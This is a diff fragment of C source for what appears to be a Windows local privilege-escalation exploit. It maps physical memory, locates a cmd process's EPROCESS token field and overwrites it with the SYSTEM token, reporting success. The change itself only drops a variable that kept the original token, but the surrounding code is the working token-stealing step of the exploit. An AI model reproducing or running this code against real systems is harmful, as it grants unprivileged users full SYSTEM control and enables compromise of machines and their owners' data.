@@ -109,8 +109,6 @@ int main(int argc, char** argv)
 	}
 
 
-	unsigned __int64 cmdToken = 0;
-
 	for (int i = 0; i < EPROCESS_cmd_size; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, EPROCESS_cmd_page[i], 0x4000, buf) == FALSE) {
 			fprintf(stderr, "[!] MapPhysicalMemory failed\n");
@@ -122,7 +120,6 @@ int main(int argc, char** argv)
 		castedBuf = (unsigned char*)castedBuf + EPROCESS_cmd_page_offset[i];
 		castedBuf = (unsigned char*)castedBuf + _EPROCESS_Token_offset;
 		printf("This should be the token: %p\n", (void*)*(unsigned __int64*)castedBuf);
-		cmdToken = *(unsigned __int64*)castedBuf;
 		*(unsigned __int64*)castedBuf = systemToken; // this should do it
 		printf("[+] Replaced cmd Token with System Token\n");
 
